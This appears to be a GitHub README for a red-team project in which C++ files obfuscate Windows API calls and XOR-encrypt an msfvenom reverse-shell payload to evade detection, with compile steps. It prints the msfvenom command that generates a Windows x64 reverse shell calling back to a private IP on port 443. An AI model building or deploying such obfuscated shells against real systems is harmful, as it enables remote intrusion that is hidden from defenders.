# Function Call Obfuscation

## Details
This was inspired by `https://jamespatricksec.medium.com/function-call-obfuscation-51f6bb171767` and `https://medium.com/@irfanbhat3/function-call-obfuscation-1bcd58e62b8e` where it is discussed and shown how to *obfuscate function calls* for **Windows binaries**. The `Original.cpp` contains the original function calls before any obfuscation. The `SC_Rev.cpp` obfuscates `VirtualProtect`, `VirtualAlloc`, `CreateThread` `WaitForSingleObject`. Both use the **standard msfvenom** shellcode with `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.3.4 LPORT=443 -f c -v shellcode_payload` for testing purposes. The `XOR_Rev.cpp` uses a **basic xor encryption** for the shellcode utilizing the `sc_xor.cpp` file. The `Rev.cpp` is originally found in `https://github.com/tihanyin/Simple-Reverse-Shell/blob/main/Reverse_shell_2021_12.cpp` with some minor modifications and obfuscating the `CreateProcess` function call. All of them use the `func_xor.cpp` script for **xor encryption** of the function name.

## Compiling
1. For both `func_xor.cpp` and `sc_xor.cpp` use `g++ func_xor.cpp -o func_xor` if compiling on **Linux**

2. For the others, you **Console App C++** in *Visutal Studio*. Use the `Release x64` option when building the binary.
